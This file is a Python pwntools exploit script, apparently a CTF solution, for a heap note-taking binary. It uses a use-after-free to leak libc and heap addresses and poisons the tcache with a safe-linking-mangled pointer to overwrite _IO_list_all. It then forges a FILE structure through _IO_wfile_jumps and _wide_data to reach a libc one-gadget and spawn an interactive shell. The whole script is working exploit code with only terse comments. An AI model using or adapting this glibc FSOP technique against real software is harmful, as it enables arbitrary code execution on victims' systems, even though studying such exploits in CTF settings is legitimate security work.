from pwn import *

# context.log_level = "debug"
elf = ELF("./vuln")
context.arch='amd64'
# r = gdb.debug("./vuln_patched", gdbscript="")
r = process("./vuln_patched")
def create():
	r.recvuntil(b"> ")
	r.sendline(b"1")
def delete(num):
	r.recvuntil(b"> ")
	r.sendline(b"2")
	r.recvuntil(b"Index: ")
	r.sendline(str(num).encode())
def edit(num, data):
	r.recvuntil(b"> ")
	r.sendline(b"3")
	r.recvuntil(b"Index: ")
	r.sendline(str(num).encode())
	r.recvuntil(b"Data: ")
	r.sendline(data)
def view(num):
	r.recvuntil(b"> ")
	r.sendline(b"4")
	r.recvuntil(b"Index: ")
	r.sendline(str(num).encode())
	r.recvuntil(b"Note content:")
	return r.read(0xF0, timeout=0.5)

def get_safe_linking(ptr, where): # P = (L >> 12) XOR mangled
	return ptr >> 12 ^ where

create()
create()
create()
create()
create()
create()
create()
create()
create()
delete(0)
delete(1)
delete(2)
delete(3)
delete(4)
delete(5)
delete(6)
delete(7)

libc = ELF("libc.so.6")
libcaddr = int((u64(view(7)[0:8]))>>8)-96- libc.sym.main_arena
libc.address = libcaddr

info("libc : "+hex(libcaddr))
hbase = u64(b'\0'+view(0)[1:8])*16
info("hbase : "+hex(libcaddr))


"""
	FSOP 
		fp->_IO_write_ptr > fp->_IO_write_base
		
		ignore all of this : 
			(_IO_vtable_offset (fp) == 0
			&& fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
			> fp->_wide_data->_IO_write_base))
	
		_IO_wdoallocbuf
"""

create() # allocate 0, UAF 6, offset 8a0

_wide_data = b'\0'*0x68
_wide_data += p64(libcaddr+0xebc85)
_wide_data += b"\x00" * (0xe0 - len(_wide_data))
_wide_data += p64(hbase+0xaa0)

edit(8, _wide_data) # 0xaa0

arr = FileStructure(0)
arr._IO_write_ptr = 1
arr._IO_write_base = 0
arr.vtable = p64(libc.sym['_IO_wfile_jumps'])
arr._wide_data = p64(hbase+0xaa0)

edit(5, p64(get_safe_linking(hbase, libc.sym['_IO_list_all']))) 
edit(0, bytes(arr)) # 0x8a0 = _IO_FILE_PLUS

create() # allocate 1, UAF 5
create() # Trigger Overwrite _IO_list_all, allocate 2, UAF 4

edit(2, p64(hbase+0x8a0)) # _IO_list_all -> (struct _IO_FILE_PLUS*) 0x8a0

r.interactive()


